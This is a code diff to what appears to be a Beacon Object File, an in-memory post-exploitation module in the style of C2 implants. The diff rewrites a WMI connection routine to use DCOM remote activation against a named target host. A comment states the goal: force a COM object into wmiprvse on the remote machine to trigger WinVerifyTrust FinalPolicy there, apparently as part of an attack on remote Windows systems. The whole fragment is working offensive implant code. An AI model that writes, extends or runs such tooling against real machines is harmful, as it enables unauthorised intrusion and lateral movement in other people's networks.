@@ -45,6 +45,7 @@ DECLSPEC_IMPORT BOOL     WINAPI KERNEL32$HeapFree(HANDLE, DWORD, LPVOID);
 DECLSPEC_IMPORT HRESULT  WINAPI OLE32$CoInitializeEx(LPVOID, DWORD);
 DECLSPEC_IMPORT VOID     WINAPI OLE32$CoUninitialize(void);
 DECLSPEC_IMPORT HRESULT  WINAPI OLE32$CoCreateInstance(REFCLSID, LPUNKNOWN, DWORD, REFIID, LPVOID*);
+DECLSPEC_IMPORT HRESULT  WINAPI OLE32$CoCreateInstanceEx(REFCLSID, IUnknown*, DWORD, COSERVERINFO*, DWORD, MULTI_QI*);
 DECLSPEC_IMPORT HRESULT  WINAPI OLE32$CoSetProxyBlanket(IUnknown*, DWORD, DWORD, OLECHAR*, DWORD, DWORD, RPC_AUTH_IDENTITY_HANDLE, DWORD);
 
 DECLSPEC_IMPORT BSTR     WINAPI OLEAUT32$SysAllocString(const OLECHAR*);
@@ -151,29 +152,43 @@ static IWbemServices* wmi_connect(const char *target, const wchar_t *ns_suffix) 
     IID iid_IWbemLocator = {0xdc12a687, 0x737f, 0x11cf,
                              {0x88, 0x4d, 0x00, 0xaa, 0x00, 0x4b, 0x2e, 0x24}};
 
-    IWbemLocator *pLocator = NULL;
-    HRESULT hr = OLE32$CoCreateInstance(clsid_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
-                                         iid_IWbemLocator, (void**)&pLocator);
-    if (FAILED(hr)) {
-        TMB_ERR("CoCreateInstance(WbemLocator) failed: 0x%08lx", hr);
-        return NULL;
-    }
-
-    wchar_t wTarget[512];
+    /* Build wide target name for COSERVERINFO */
+    wchar_t wTarget[256];
     int i = 0;
-    wTarget[i++] = L'\\'; wTarget[i++] = L'\\';
-    for (const char *p = target; *p && i < 480; p++) wTarget[i++] = (wchar_t)*p;
-    wTarget[i++] = L'\\';
-    for (int j = 0; ns_suffix[j] && i < 510; j++) wTarget[i++] = ns_suffix[j];
+    for (const char *p = target; *p && i < 254; p++) wTarget[i++] = (wchar_t)*p;
     wTarget[i] = L'\0';
 
-    TMB_INFO("Connecting WMI: %S", wTarget);
+    /* ponytail: DCOM remote activation -- forces COM object inside wmiprvse on target.
+     * This is THE difference vs CoCreateInstance(CLSCTX_INPROC_SERVER) which creates
+     * a local proxy that never triggers WVT FinalPolicy on the remote side. */
+    COSERVERINFO si;
+    MSVCRT$memset(&si, 0, sizeof(si));
+    si.pwszName = wTarget;
 
-    BSTR bstrTarget = OLEAUT32$SysAllocString(wTarget);
+    MULTI_QI mqi;
+    MSVCRT$memset(&mqi, 0, sizeof(mqi));
+    mqi.pIID = &iid_IWbemLocator;
+
+    TMB_INFO("DCOM remote activation on %s", target);
+    HRESULT hr = OLE32$CoCreateInstanceEx(clsid_WbemLocator, NULL,
+                                           CLSCTX_REMOTE_SERVER, &si, 1, &mqi);
+    if (FAILED(hr)) {
+        TMB_ERR("CoCreateInstanceEx(WbemLocator) failed: 0x%08lx", hr);
+        return NULL;
+    }
+    if (FAILED(mqi.hr)) {
+        TMB_ERR("MULTI_QI interface query failed: 0x%08lx", mqi.hr);
+        return NULL;
+    }
+    IWbemLocator *pLocator = (IWbemLocator*)mqi.pItf;
+
+    /* ConnectServer uses bare namespace -- already on the remote machine */
+    TMB_INFO("Connecting WMI namespace: %S", ns_suffix);
+    BSTR bstrNs = OLEAUT32$SysAllocString(ns_suffix);
     IWbemServices *pSvc = NULL;
-    hr = pLocator->ConnectServer(bstrTarget, NULL, NULL, 0,
+    hr = pLocator->ConnectServer(bstrNs, NULL, NULL, 0,
                                   WBEM_FLAG_CONNECT_USE_MAX_WAIT, NULL, NULL, &pSvc);
-    OLEAUT32$SysFreeString(bstrTarget);
+    OLEAUT32$SysFreeString(bstrNs);
     pLocator->Release();
 
     if (FAILED(hr)) {
